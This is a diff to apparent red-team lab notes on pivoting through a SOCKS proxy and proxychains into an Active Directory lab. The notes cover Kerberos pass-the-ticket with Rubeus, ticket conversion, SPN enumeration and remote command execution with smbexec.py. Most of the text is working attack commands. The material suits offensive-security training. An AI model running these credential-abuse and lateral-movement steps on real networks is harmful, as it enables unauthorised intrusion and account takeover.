@@ -8,10 +8,32 @@ SOCKS (socket secure) proxy:
     enter the IP of the team server and the port (e.g. 1080)
     select the corresponding "SOCKS" protocol
     we can then add a proxification rule to specify the IP (range) of our target host
-  to authenticate on windows (on attacker windows desktop):
+  to authenticate via windows (on attacker windows desktop):
     authenticate using kerberos tickets (NOTE: add the hostname first, PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1')
-    then create a credential object:
-      PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
-      PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1
-
+      create a credential object:
+        PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO.COM\rsteel
+      perform pass the authentication material:
+        PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1
+      start a new process as the user:
+        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:rsteel /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show
+      query AD to get a ticket:
+        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:lon-dc-1 /ptt
+      verify by running klist!
+    once were authenticated, we can query the target DC
+      e.g. PS C:\Users\Attacker> ipmo ActiveDirectory
+          PS C:\Users\Attacker> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1 | select DistinguishedName
+  proxychains:
+    first we must edit the last line of /etc/proxychains.conf to match our IP and port
+      e.g. socks4 10.0.0.5 1080
+    then we can run commands prepended with 'proxychains'
+      e.g. proxychains smbexec.py 'CONTOSO/rsteel:Passw0rd!@lon-ws-1'
+    to authenticate via linux:
+      authenticate using kerberos tickets in ccache format
+        convert to ccache:
+          $ ticketConverter.py rsteel.kirbi rsteel.ccache
+        set env variable:
+          $ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache
+        usage example:
+          $ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1
+          
 reverse port forwarding
